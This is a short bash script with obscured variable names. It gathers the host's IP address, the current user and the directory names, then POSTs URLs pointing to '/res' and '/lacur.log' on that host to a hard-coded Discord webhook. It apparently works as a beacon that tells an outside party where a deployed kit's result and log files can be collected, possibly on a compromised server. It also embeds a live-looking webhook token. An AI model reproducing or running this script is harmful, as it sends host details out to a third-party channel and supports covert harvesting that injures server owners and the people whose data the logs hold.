#!/bin/bash
prot="http://"
jamet=$(hostname -i) #host
kuproy=$(whoami) #user
# shellcheck disable=SC2006
letak=$(basename `cd ../; pwd`) #..pwd
celeng=$(pwd | awk -F/ '{print $NF}') #current
res="/res"
lacur="/lacur.log"
split="/"
smol='\n'
hook='https://discordapp.com/api/webhooks/739215255284088935/YXdLTBznRid8I2YRV9gAhNuLz1ZfKxi5gzGURWR8hMcz6Y26EBTbhq6Vqs2tAbeFb7It'

url=${hook}
curl -H "Content-Type: application/json" \
-X POST \
-d '{"username": "Mashu", "content": "'${prot}${jamet}'/~'${kuproy}${split}${letak}${split}${celeng}${res}${smol}${prot}${jamet}'/~'${kuproy}${split}${letak}${split}${celeng}${lacur}'"}' $url